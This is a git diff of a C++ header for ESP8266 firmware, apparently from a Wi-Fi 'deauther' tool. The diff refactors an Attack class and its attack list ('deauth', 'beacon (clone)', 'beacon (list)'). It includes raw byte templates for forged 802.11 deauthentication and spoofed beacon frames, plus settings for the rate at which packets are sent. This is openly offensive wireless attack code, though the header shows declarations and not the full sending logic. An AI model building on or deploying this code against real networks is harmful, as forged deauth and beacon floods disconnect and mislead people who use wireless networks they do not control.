@@ -1,7 +1,7 @@
 #ifndef Attack_h
 #define Attack_h
 
-#include "ESP8266WiFi.h"
+#include <ESP8266WiFi.h>
 
 extern "C" {
   #include "user_interface.h"
@@ -12,19 +12,12 @@ extern "C" {
 #include "APScan.h"
 #include "ClientScan.h"
 
-#define attackNum 4 //number of defined attacks
-
-#define deauthsPerSecond 10 //number of deauthentication & disassociation frames sent per second per target.
-
-#define beaconPerSecond 10 //number of beacon frames sent per second
-#define randomBeacons 80 //number of generated beacon frames
-#define SSIDLen 32 //SSID length of random generated APs (random beacon spam)
-#define randomBeaconChange 3 //time in seconds after new beacon frames are generated
-#define beaconChannel 10 //channel to send beacon frames on (only for the packet bytes, it will actually sent on the current channel)
+#define attacksNum 3
 
 extern void PrintHex8(uint8_t *data, uint8_t length);
 extern void getRandomVendorMac(uint8_t *buf);
 extern String data_getVendor(uint8_t first,uint8_t second,uint8_t third);
+extern const bool debug;
 
 extern APScan apScan;
 extern ClientScan clientScan;
@@ -33,27 +26,37 @@ class Attack
 {
   public:
     Attack();
-    void generate(int num);
-    void start(int num);
-    String getResults();
+    void generate();
     void run();
-    void stopAll();
+    void start(int num);
     void stop(int num);
+    void stopAll();
+    String getResults();
   private:
-    void generateBeaconPacket();
-    bool send(uint8_t buf[], int len);
-    
-    const String attackNames[attackNum] = {"deauth selected","deauth all","beacon spam","random beacon spam"};
-    String stati[attackNum];
-    int packetsCounter[attackNum];
-    bool running[attackNum];
 
-    unsigned long previousMillis[attackNum];
-    unsigned long previousSecond[attackNum];
-    unsigned long previousRandomBeaconMillis;
-    unsigned long currentMillis = 0;
-
+    void buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason);
+    void buildBeacon(Mac _ap, Mac _client, String _ssid, int _ch, bool encrypt);
+    bool send();
     
+    //attack declarations
+    const String attackNames[attacksNum] = {"deauth","beacon (clone)","beacon (list)"};
+    
+    //attack infos
+    String stati[attacksNum];
+    unsigned int packetsCounter[attacksNum];
+    bool isRunning[attacksNum];
+    const int packetRate = 10 ;
+
+    MacList beaconAdrs;
+    
+    //packet buffer
+    uint8_t packet[128];
+    int packetSize;
+
+    //timestamp for running every attack
+    unsigned long prevTime[attacksNum];
+    
+    //packet declarations
     uint8_t deauthPacket[26] = {
       /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
       /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
@@ -64,39 +67,25 @@ class Attack
       /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
     };
     
-
-    uint8_t beaconSSIDs[randomBeacons][SSIDLen];
-    uint8_t beaconMACs[randomBeacons][6];
-    //uint8_t beaconChannels[randomBeacons];
-
-    uint8_t beaconNumbers[randomBeacons];
-    
-    uint8_t packet[128];
-    int packetSize;
-    
-    int randomBeaconCounter = 0;
-    int oldRandomBeacon = 0; //first beacon to regenerated after >>randomBeaconChange<< seconds
-    
     uint8_t beaconPacket_header[36] = { 
-                0x80, 0x00, 
-                0x00, 0x00, //beacon
-                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //destination: broadcast
-                0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
-                0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
-                0xc0, 0x6c, 
-                0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
-                0x64, 0x00, 
-                0x01, 0x04/*, 
-                0x00, 0x06, //SSID size
-                0x72, 0x72, 0x72, 0x72, 0x72, 0x72, //SSID
-                >>beaconPacket_end<<
-                0x04 //channel*/
+      /*  0 - 1  */ 0x80, 0x00, 
+      /*  2 - 3  */ 0x00, 0x00, //beacon
+      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //destination: broadcast
+      /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
+      /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
+      /* 22 - 23 */ 0xc0, 0x6c,
+      /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
+      /* 32 - 33 */ 0xe8, 0x03, //0x64,0x00 => every 100ms
+      /* 34 - 35 */ 0x01, 0x04
+                 /*,0x00, 0x06, //SSID size
+                    0x72, 0x72, 0x72, 0x72, 0x72, 0x72, //SSID
+                    >>beaconPacket_end<<*/
     };
 
-    uint8_t beaconPacket_end[13] = {
+    uint8_t beaconPacket_end[12] = {
       0x01, 0x08, 0x82, 0x84,
-      0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
-      beaconChannel //channel  
+      0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01
+     /*,channel*/
     };
 
     uint8_t beaconWPA2tag[26] = {
